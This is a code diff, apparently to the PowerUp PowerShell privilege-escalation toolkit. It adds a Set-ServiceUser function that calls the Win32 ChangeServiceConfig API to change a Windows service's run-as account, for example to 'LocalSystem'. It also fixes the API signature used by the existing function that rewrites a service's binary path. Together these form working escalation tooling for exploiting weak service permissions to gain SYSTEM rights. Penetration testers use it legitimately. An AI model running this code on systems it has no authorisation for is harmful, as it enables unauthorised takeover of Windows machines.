@@ -2680,6 +2680,7 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx
         }
 
         try {
+            Add-Type -AssemblyName system.serviceprocess
             $GetServices = [ServiceProcess.ServiceController].GetMethod('GetServices', 'public, static', $null, [type[]]@(), $null)
             $Services = $GetServices.Invoke($null, $null)
         } catch [System.InvalidOperationException] {
@@ -2709,10 +2710,126 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx
             if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
 
                 $SERVICE_NO_CHANGE = [UInt32]::MaxValue
-                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$Path", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$Path", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [NullString]::Value, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
                 if ($Result -ne 0) {
                     Write-Host "[+] binPath for $IndividualService successfully set to '$Path'"
+                }
+                else {
+                    Write-Error ([ComponentModel.Win32Exception] $LastError)
+                }
+
+                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
+            }
+        }
+    }
+}
+
+function Set-ServiceUser {
+<#
+.SYNOPSIS
+
+Sets the service user for a service to a specified value.
+
+Author: Tobias Neitzel (@qtc_de)
+License: BSD 3-Clause
+Required Dependencies: PSReflect, PowerShell v3
+
+.DESCRIPTION
+
+Takes a service Name or a PowerUp.Service object on the pipeline and first opens up a
+service handle to the service with ConfigControl access using the GetServiceHandle
+Win32 API call. ChangeServiceConfig is then used to set the service user (lpServiceStartName)
+to the string value specified by -User, and the handle is closed off.
+
+.PARAMETER Name
+
+An array of one or more service names to set the service user for. Required.
+
+.PARAMETER User
+
+The new service user (lpServiceStartName) to set for the specified service. Required.
+
+.EXAMPLE
+
+Set-ServiceUser -Name VulnSvc -User 'LocalSystem'
+
+Sets the service user for 'VulnSvc' to 'LocalSystem'.
+
+.EXAMPLE
+
+Get-Service VulnSvc | Set-ServiceUser -User 'LocalSystem'
+
+Sets the service user for 'VulnSvc' to 'LocalSystem'.
+
+#>
+
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
+    [CmdletBinding()]
+    Param(
+        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+        [Alias('ServiceName')]
+        [String[]]
+        [ValidateNotNullOrEmpty()]
+        $Name,
+
+        [Parameter(Position=1, Mandatory = $True)]
+        [Alias('ServiceUser', 'StartName')]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $User
+    )
+
+    BEGIN {
+        filter Local:Get-ServiceConfigControlHandle {
+            [OutputType([IntPtr])]
+            Param(
+                [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
+                [ServiceProcess.ServiceController]
+                [ValidateNotNullOrEmpty()]
+                $TargetService
+            )
+            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
+            $ConfigControl = 0x00000002
+            $RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))
+            $RawHandle
+        }
+
+        try {
+            Add-Type -AssemblyName system.serviceprocess
+            $GetServices = [ServiceProcess.ServiceController].GetMethod('GetServices', 'public, static', $null, [type[]]@(), $null)
+            $Services = $GetServices.Invoke($null, $null)
+        } catch [System.InvalidOperationException] {
+            Write-Error "Service enumeration via ServiceController: Failed. [Access Denied]"
+            return $null
+        }
+
+    }
+
+    PROCESS {
+
+        ForEach($IndividualService in $Name) {
+
+            $TargetService = $Services | Where-Object { $_.Name -eq $IndividualService }
+            if( $TargetService -eq $null ) {
+                Write-Error "Specified service '$IndividualService' not found."
+            }
+
+            try {
+                $ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
+            }
+            catch {
+                $ServiceHandle = $Null
+                Write-Error "Error opening up the service handle with read control for $IndividualService : $_"
+            }
+
+            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
+
+                $SERVICE_NO_CHANGE = [UInt32]::MaxValue
+                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, [NullString]::Value, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, "$User", [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+                if ($Result -ne 0) {
+                    Write-Host "[+] StartName for $IndividualService successfully set to '$User'"
                 }
                 else {
                     Write-Error ([ComponentModel.Win32Exception] $LastError)
@@ -5182,7 +5299,7 @@ $FunctionDefinitions = @(
     (func advapi32 LookupPrivilegeName ([Int]) @([IntPtr], [IntPtr], [String].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
     (func advapi32 QueryServiceConfig ([Bool]) @([IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError -Charset Unicode),
     (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
-    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
+    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [String], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
     (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError),
     (func ntdll RtlAdjustPrivilege ([UInt32]) @([Int32], [Bool], [Bool], [Int32].MakeByRefType()))
 )
